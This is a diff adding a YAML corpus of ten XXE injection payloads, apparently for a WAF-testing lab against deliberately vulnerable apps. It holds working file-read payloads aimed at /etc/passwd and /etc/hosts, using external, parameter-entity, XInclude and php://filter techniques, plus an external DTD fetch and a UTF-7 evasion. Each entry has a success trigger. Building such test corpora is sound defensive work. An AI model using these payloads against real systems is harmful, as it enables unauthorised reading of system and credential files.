@@ -1,0 +1,77 @@
+# XML external entity payloads — 10 entries (prompt.md §6 ≥10).
+# Sources: PayloadsAllTheThings/XXE Injection, OWASP WSTG.
+#
+# The corpus is sent via the default endpoint as a string (no live XML sink
+# in DVWA/WebGoat/Juice Shop by default). Once the context_displacement
+# mutator is applied, these get re-sent as real XML bodies against the WAF
+# matrix — that is the interesting path for XXE on this lab.
+
+- id: xxe-passwd-basic
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings/XXE — baseline file read"
+
+- id: xxe-hosts
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><r>&x;</r>"
+  trigger: { kind: regex, pattern: "127\\.0\\.0\\.1|localhost" }
+  cwe: CWE-611
+  source: "OWASP WSTG v4.2 §4.7.5"
+
+- id: xxe-external-dtd
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://127.0.0.1:9/evil.dtd\"><r>waflab-xxe-probe</r>"
+  trigger: { kind: contains, needle: "waflab-xxe-probe" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — external DTD"
+
+- id: xxe-param-entity
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\"> %a;]><r>1</r>"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — parameter entity"
+
+- id: xxe-xinclude
+  class: xxe
+  payload: "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></r>"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — XInclude"
+
+- id: xxe-soap-style
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x \"waflab-xxe-probe\">]><env:Envelope><env:Body><r>&x;</r></env:Body></env:Envelope>"
+  trigger: { kind: contains, needle: "waflab-xxe-probe" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — SOAP envelope"
+
+- id: xxe-php-filter
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>"
+  trigger: { kind: regex, pattern: "[A-Za-z0-9+/]{40,}={0,2}" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — PHP wrapper in XXE"
+
+- id: xxe-nested-entity
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY a \"waflab-\"><!ENTITY b \"xxe-probe\"><!ENTITY c \"&a;&b;\">]><r>&c;</r>"
+  trigger: { kind: contains, needle: "waflab-xxe-probe" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — nested entities"
+
+- id: xxe-utf7
+  class: xxe
+  payload: "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADwAIQ-DOCTYPE r +AFs-+ADwAIQ-ENTITY x +ACI-waflab-xxe-probe+ACI-+AF0APg-+ADw-r+AD4-+ACY-x+ADsAPA-/r+AD4-"
+  trigger: { kind: contains, needle: "waflab-xxe-probe" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — encoding trick"
+
+- id: xxe-data-uri
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"data:text/plain,waflab-xxe-probe\">]><r>&x;</r>"
+  trigger: { kind: contains, needle: "waflab-xxe-probe" }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — data URI entity"
